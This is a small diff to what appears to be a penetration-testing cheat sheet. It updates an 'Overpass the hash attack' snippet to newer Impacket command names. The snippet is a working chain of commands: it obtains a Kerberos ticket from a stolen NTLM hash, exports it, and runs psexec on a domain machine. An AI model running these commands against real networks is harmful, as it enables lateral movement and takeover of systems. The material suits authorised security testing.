@@ -112,9 +112,9 @@ Overpass the hash attack
 #overpass-the-hash
 
 ```shell
-impacket-getTGT.py $TARGET_DOMAIN/$USER -hashes :$HASH
+impacket-getTGT $TARGET_DOMAIN/$USER -hashes :$HASH
 export KRB5CCNAME=$(pwd)/$USER.ccache
-python psexec.py $TARGET_DOMAIN/$USER@$MACHINE_NAME.$TARGET_DOMAIN -k -no-pass
+impacket-psexec $TARGET_DOMAIN/$USER@$MACHINE_NAME.$TARGET_DOMAIN -k -no-pass
 ```
 
 PKI Admin access
